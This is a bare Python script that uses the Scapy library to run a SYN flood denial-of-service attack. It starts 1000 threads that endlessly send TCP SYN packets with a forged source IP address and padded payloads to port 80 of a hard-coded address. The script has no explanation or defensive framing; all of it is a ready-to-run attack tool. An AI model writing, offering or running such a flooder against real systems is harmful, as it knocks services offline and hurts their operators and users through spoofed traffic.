from scapy.all import *
import random
from threading import Thread

dst_IP = "172.21.209.231"
dst_PORT = 80

raw = Raw(b"X"*1048)

def random_PORT():
  return random.randint(1058, 40000)

def SYN_Flood():

  while True:

    try:
      ip_pkg = IP()
      ip_pkg.src = "200.144.94.19"
      ip_pkg.dst = dst_IP

      src_PORT = random_PORT()

      tcp_pkg = TCP()
      tcp_pkg.sport = src_PORT
      tcp_pkg.dport = dst_PORT
      tcp_pkg.flags = "S"

      pkg = ip_pkg / tcp_pkg /raw

      send(pkg, verbose=0)

    except:
      thread.join()

if __name__ == "__main__":
    
    for i in range(1000):
      thread = Thread(target = SYN_Flood)
      thread.start()